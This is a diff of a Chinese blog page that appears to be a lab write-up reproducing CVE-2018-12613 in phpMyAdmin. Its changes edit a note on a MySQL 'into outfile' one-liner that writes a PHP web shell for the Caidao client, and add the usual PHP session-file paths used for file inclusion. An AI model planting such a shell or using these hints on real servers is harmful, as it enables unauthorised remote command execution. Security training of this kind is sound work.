@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a27f503b54.png">
 <meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a297866139.png">
 <meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png">
-<meta property="og:updated_time" content="2019-03-27T02:18:13.567Z">
+<meta property="og:updated_time" content="2019-03-27T03:10:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CVE-2018-12613漏洞复现">
 <meta name="twitter:description" content="前言第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。 靶机链接https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe 解题思路注入  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别">
@@ -279,9 +279,15 @@
 <p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
 <h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL写一句话（MySQL）</p>
 <blockquote>
-<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，即注入路径。</p>
+<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，，即注入路径file.php文件名可以随便填写。</p>
 </blockquote>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
+<h3 id="sessionID文件常见路径"><a href="#sessionID文件常见路径" class="headerlink" title="sessionID文件常见路径"></a>sessionID文件常见路径</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>常见的文件路径为： /var/lib/php/session/</p>
+</blockquote>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
+<p>phpstudy集成软件环境下，文件路径为：<br>/phpstudy/PHPTutorial/tmp/tmp<br>Wamp集成软件环境下，文件路径为：<br>/wamp64/tmp”</p>
+</blockquote>
+<h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
       
     </div>
     
